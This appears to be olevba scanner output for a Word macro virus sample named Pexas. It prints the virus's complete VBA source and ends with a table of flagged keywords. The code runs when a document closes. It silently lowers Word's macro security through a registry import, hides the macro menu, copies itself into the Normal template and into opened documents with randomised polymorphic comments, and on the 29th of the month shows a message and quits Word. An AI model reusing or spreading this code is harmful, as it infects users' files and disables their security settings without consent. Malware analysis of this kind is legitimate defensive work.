olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas-68a9fa2a33ee500c730c52ab766bd9ca97553cc1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas-68a9fa2a33ee500c730c52ab766bd9ca97553cc1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'<XasPerant> Virus by MI_pirat '4–qf '{•o" '�te
'XP-only virus (10q Bill 4 a great Office...NOT) 'j4€Y 'RuaJ 'AH�†
On Error Resume Next 'N„.~ 'pT6: '$a#”
StatusBar = Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) '“…6i '—!+ˆ 't}�†
zi = Day(Date) 'me…A '0\-h 't(QW
If zi = 29 Then '—s<1 '�+yx 'vq‚}
MsgBox Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) + Chr(32) + Chr(82) + Chr(79) + Chr(99) + Chr(107) + Chr(122), vbInformation, Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) '`�5d 'l<v‡ 'P•(
Application.Quit (False) 'tDv= 'J"„Q 'FiH�
End If '%V”k 'A€$L '0„…Ž
'DRINK (TM)... Motto: "DRINKDRINKDRINK" !!! 'sF6 '—2wE '-<–�
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then '%"*L 'F�Lr '{_gz
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP" 'w•U‡ '\uDD '†}e‰
Options.SaveNormalPrompt = 5 Xor 5 '€GŒ2 'pS�- 'bysp
Open "C:\a.reg" For Output As #1 '8e'= '_<V9 '�ar}
Print #1, "REGEDIT4" 'XT�D 'Iqq/ 'n_b•
Print #1, "" 'n!‰� '.)gE 'ŒS2[
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" 'f6ug '%2*Ž 'jz'W
Print #1, """Level"" = dword:00000001" '?=\c '9�0‚ '�Oew
Close #1 'g~az 'dŠPˆ '‰g1…
Shell "C:\Windows\regedit /s C:\a.reg" 'Iƒ) '/G$S 'I–„K
Kill "C:\a.reg" 'G=x“ 'N!{* '?)>E
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1) '‡LP' '*,;{ '+ƒc—
Randomize 'Z�yJ ',;dˆ '[c„–
nr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines '�)9E 't�8Œ 'B-nQ
Set myTemplate = Templates(1) '7”b\ '’D•8 'p9ˆW
myTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, myTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines ';;ŒF 'W„U� 'n.|/
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close" 'TŽ0” 'EgTD '~_H@
For i = 2 To nr 'uqP '@k‘? '*t†…
xxx = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1) 'j+—x '9a0( '=†xR
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) 'ˆKP0 '‹YvP ',€h“
strn = xxx + " '" + poly ' 2ny '�3`i 'G†g„
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, strn 'K~‰” '\MF< 'L�”*
Next i '@f1P 'Ž`ˆz 'r—��
Documents.Open FileName:=myTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto '\abg '4lBi '5pta
ActiveDocument.Save '–9^& 'XHk\ '‹.‚'
ActiveDocument.Close 'x�Q_ 'HPq… '–7}…
End If '*pI\ '&E)e '�†€"
For Each aVar In ActiveDocument.Variables '0‚<— 'I2f5 'ˆz“9
    If aVar.Name = "xp" Then num = aVar.Index 'S�6^ 'N}xŒ 'c6Xd
Next aVar '�Q#Q '�5hG ''4B&
If (num = 0) And (NormalTemplate.FullName <> ActiveDocument.FullName) Then ';�2D '…1Œ, '*ŒŽ�
ActiveDocument.Variables.Add Name:="xp" '–Yg� 'w.H“ 'RI`]
ActiveDocument.Variables("xp").Value = 1 'kSK# '�N0! 'i0>=
Set myTemplate = Templates(1) 'F\—‚ 'xS�8 '’z|Œ
nr = myTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines '0ySD 'ey2 'n‡-2
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines 'c%$3 '‡‹Z- 'D”€@
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Open" '2$—u 'vHH? 'hH/9
For i = 2 To nr ']=ƒ5 'P/t: '@-x…
s = myTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1) 'YT<? 'lO=~ '@sXW
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, s 'fE8� 'b(<— 'AQRb
Next i 'KD� 'j#-J 'HMD†
ActiveDocument.Save 'L$C7 '‰[CL 'Šn•b
End If '5,�4 'KkDF '‰mF…
End Sub ''D•5 '…['< 'EuAq
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

